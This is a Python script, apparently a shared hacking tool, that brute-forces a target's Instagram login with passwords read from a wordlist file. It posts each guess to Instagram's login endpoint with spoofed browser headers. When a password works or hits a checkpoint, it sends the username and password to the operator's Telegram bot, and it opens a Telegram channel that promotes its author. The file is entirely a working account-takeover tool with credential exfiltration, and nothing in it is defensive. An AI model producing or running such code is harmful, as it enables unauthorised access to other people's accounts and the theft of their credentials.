import time
import string
import random
import requests
import webbrowser
import os
import sys as n
import time as mm

session = requests.session()

def KURD(M):
    for c in M + '\n':
        n.stdout.write(c)
        n.stdout.flush()
        mm.sleep(1. / 100)

KURD('''\033[1;32m
 ____    ____  _______     ____  ____  
|_   \  /   _||_   __ \   |_  _||_  _| 
  |   \/   |    | |__) |    \ \  / /   
  | |\  /| |    |  __ /      > `' <    
 _| |_\/_| |_  _| |  \ \_  _/ /'`\ \_  
|_____||_____||____| |___||____||____| 
                                       



\x1b[0m''')

user = input('User Instagram ==> ')
id = input(' ID Telegram  ==> ')
token = input('Token Bot ==> ')


pess = 'piss.txt'
file = open(pess, 'r')


def insta():
  while True:
    pess = file.readline().split('\n')[0]
    url = 'https://www.instagram.com/accounts/login/ajax/'

    headers = { 
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
	'x-csrftoken': 'jHu55ttlksoa24nBYiVdJ9D7wKaSTCwD',
	'x-instagram-ajax': '5d8ba0e5398d',
	'x-ig-app-id': '936619743392459',}
  
    tme = str(time.time()).split('.')[1]
    data = {
	'username': f'{user}',
	'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tme}:{pess}',
	'queryParams': {},
	'optIntoOneTap': 'false',}
  
    req =     session.post(url,headers=headers,data=data)

    response = req.text
  
    if ('"authenticated":true') in response:
      print(f'Hacked :{user} pass:{pess} ')
      Telegram =(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=✅ HACKED INSTAGRAM CHANAL@python968\nuser:{user} pass:{pess} ')
      req = requests.post(Telegram)
      input("")

      
      
      
    elif '"chekpoint_url"' in response:
      print(f"secure user:{user} pass:{pess}")
      Telegram =(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=☠︎︎  @python968\nuser:{user} pass:{pess} ')
      req = requests.post(Telegram)
    
    else:
      print(f'Not Hacked user:{user} pass:{pess} ')
    time.sleep(3)
      
webbrowser.open('https://t.me/python968')
req = requests.session()
insta()